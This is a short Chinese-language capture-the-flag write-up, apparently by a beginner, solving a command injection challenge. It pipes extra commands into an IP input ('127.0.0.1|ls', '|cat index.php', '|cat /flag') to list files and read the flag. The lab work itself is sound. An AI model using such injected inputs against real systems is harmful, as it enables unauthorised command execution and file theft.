**新手上路，欢迎交流指错**

依旧练练绕过

打开题目网址，先试试ls

```
127.0.0.1|ls
```

<img width="278" height="155" alt="image" src="https://github.com/user-attachments/assets/e384d104-9791-41bc-91a0-d0c694503db7" />

发现当前目录只有 index.php

> [!NOTE]
> 大概率是网站入口，作用是接收 GET/POST 参数且包含其他 PHP文件

```
127.0.0.1|cat index.php
```

<img width="265" height="524" alt="image" src="https://github.com/user-attachments/assets/699acffe-6497-4ae7-9c5d-1438b372b301" />

只是影分身了一下

那试试看看根目录有没有什么文件

<img width="221" height="353" alt="image" src="https://github.com/user-attachments/assets/e24b740a-adb1-40fb-81a8-0851c71db145" />

那直接试试

```
127.0.0.1|cat /flag
```

> [!NOTE]
> tac 是反向读取文件（把 cat 倒过来写，功能也倒过来，从最后一行读到第一行）

获得flag

<img width="226" height="175" alt="image" src="https://github.com/user-attachments/assets/17636e09-465b-4378-8eaa-23d667e4996a" />
